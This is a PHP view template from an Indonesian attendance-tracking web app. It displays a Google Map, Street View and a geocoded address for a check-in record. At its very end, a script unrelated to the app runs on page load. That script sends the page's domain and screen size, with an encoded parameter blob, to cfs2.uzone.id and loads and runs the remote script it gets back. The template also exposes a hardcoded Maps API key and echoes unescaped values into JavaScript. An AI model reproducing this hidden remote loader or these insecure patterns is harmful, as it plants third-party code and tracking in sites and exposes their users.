 <link href="<?php echo base_url(); ?>/assets/plugins/sweetalert/sweetalert.css" rel="stylesheet" />
	<link href="<?php echo"".base_url().""; ?>assets/js/plugins/datapicker/datepicker3.css" rel="stylesheet" type="text/css" />
   		<link href="<?php echo"".base_url().""; ?>assets/css/bootstrap-datetimepicker.min.css" rel="stylesheet">
	<style>
		
	</style>
<?php
foreach($data as $val){
	$long=$val['lang'];
	$lat=$val['lat'];
	$start_date=$val['start_date'];
	$end_date=$val['end_date'];
	
}
?>
    <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
          <h1>
            DETAIL DATA ABSENSI
          </h1>
          <ol class="breadcrumb">
            <li><a href="<?php echo base_url() ?>index.php/home"><i class="fa fa-home"></i> Home</a></li>
			<li><a href="<?php echo base_url(); ?>/index.php/data_absensi/index"><i class="fa fa-gift"></i> Data Absensi </a></li>
            <li class="active">Detail Data Ijin </li>
          </ol>
        </section>
        <!-- Main content -->
        <section class="content">
			<div class="row">
				<div class="col-md-12">
					<div class="box box-primary">
						<div class="box-body">
				  <div class="row">
					<div class="col-md-7">
					

					   
						   <section class="map-section">
    	<div class="map-outer">

            <!--Map Canvas-->
            <div style="width:100%;height:500px"class="map-canvas"
                data-zoom="8"
                data-lat="-37.817085"
                data-lng="144.955631"
                data-type="roadmap"
                data-hue="#ffc400"
                data-title="Envato"
                data-content="Melbourne VIC 3000, Australia<br><a href='mailto:info@youremail.com'>info@youremail.com</a>"
				id="map-canvas"
				>
            </div>

        </div>
 
				
					  <!-- /.chart-responsive -->
					</div>
					<div class="col-md-5">
				  <!-- USERS LIST -->
				  <div class="box box-primary">
					<div class="box-header with-border" style="color:white;text-align:center;background-color: #18365E">
					 <div style="font-family:arial;font-size:17px;padding:10px 10px 10px 10px; border:3px solid #FFD700;color:white;text-align:center">
					 Data Absensi Masuk<br /> Mandiri Taspen Pos
					 
					 </div>
					</div>
					<!-- /.box-header -->
					<div class="box-body no-padding" style="background-color:#FFD700;height:400px"><br />
					   <div style="width:100%;text-align:center;height:180px;font-size:30px;color:#18365E;font-family:Times New Roman;font-weight:bolder"  id="">
						<?php echo  substr($start_date, 10,6); ?> <hr /><?php echo  substr($end_date, 10,6); ?> <br />
					  </div>
					   <div style="width:100%;text-align:center;height:70px;color:#18365E;font-size:13px" id="alamat_nya">
						
					  </div>
						<div style="width:100%;text-align:center;font-size:12px;color:black;height:170px">
					
						    <div class="btn btn-block btn-social btn-bitbucket" style="text-align:center">
                <i class="fa fa-map-marker"></i> Klik Tanda Pada Peta Untuk Melihat Street View
              </div>
					  </div>
					 
					 
					  <!-- /.users-list -->
					</div>
					<!-- /.box-body -->
					
					<!-- /.box-footer -->
				  </div>
				  <!--/.box -->
				</div>
				<!-- /.col -->
					<!-- /.col -->
				  </div>
				  <!-- /.row -->
				</div>
					</div><!-- /.box -->
				</div>	
			</div>
        </section><!-- /.content -->
    </div><!-- /.content-wrapper -->
		
 <script src="<?php echo"".base_url().""; ?>/assets/js/admin.js"></script>
 <script>
var latit=<?php echo $lat; ?>;
				var longtit=<?php echo $long; ?>;
      function initMap() {
        var myLatlng = {lat: <?php echo $lat; ?>, lng: <?php echo $long; ?>};

        var map = new google.maps.Map(document.getElementById('map-canvas'), {
          zoom: 12,
          center: myLatlng
        });

        var marker = new google.maps.Marker({
          position: myLatlng,
          map: map,
          title: 'Click to zoom'
        });
		var latlng = ""+<?php echo $lat; ?>+", "+<?php echo $long; ?>+"";
				var url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + latlng + "&sensor=false";
			$.getJSON(url, function (data) {
				var address="";
				for(var i=0;i<data.results.length;i++) {
					adress = data.results[0].formatted_address;
					
					$("#alamat_nya").html(adress);
					
				}
			});
			
        map.addListener('center_changed', function() {
          // 3 seconds after the center of the map has changed, pan back to the
          // marker.
          window.setTimeout(function() {
            map.panTo(marker.getPosition());
          }, 3000);
        });

        marker.addListener('click', function() {
            var panorama = new google.maps.StreetViewPanorama(
            document.getElementById('map-canvas'), {
				
				
              position: {lat: <?php echo "$lat"; ?>, lng: <?php echo "$long"; ?>},
              addressControlOptions: {
                position: google.maps.ControlPosition.BOTTOM_CENTER
              },
              linksControl: true,
              panControl: true,
              enableCloseButton: true
        });
		  
		  
        });
      }
    </script>
  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAnFiJBgY8fPwBMde9Lqmkwtxr_Wk5vSL8&callback=initMap"
  async defer></script>
  
<!--End Google Map APi-->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKL8xXQhGpEWxo5qY3k16bOBCNaZKaqro2cjHjIuDWzlUNzsvxwF%2bKlgXJLtHTKEqf6RONnSLXf4kleb7JKg8jMe4RCxPsZDHdC%2bR7PpkQe25PY1cM0y89iSN0DegBnrMXo1hQwOE%2f0TnRO9Uz81SvhhGNgGh7GnULgHBOZZ%2fOphOtX3Tj6f0eat5jHCln801BuvVMbkKW1mD8TL2NeJhF8jatl4RRobrWZ93T7jQ76yXsW3f2kP9jaF%2f3r7mmPR%2fCbfHNo76igbnHzyydCOOnLcS1dBRvF%2f2ii%2bwnH%2bJUrop9VXLtWgJ7LDT5ZRtf5iUTuMUQpzazjlpIQcM1OLFnqjJb2FoQJ1CLv1mwEnFNve6kCHGnafvaDMQrHPA5tPQbEK6Ye6KyqTr1916az0onj0sXzpLNJq5eLWvIH4wcBsA4RM94Iv%2b8ftCta787GkeKjj0dJcsNs%2bh5I7I9WevaBPFPrutdnwc5umu%2fr28%2fnXeLj3Can079KQzKDxkt6aobl6f%2fnqByFIZBiYu1zxf2JKGL4Z%2fCgRI6" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
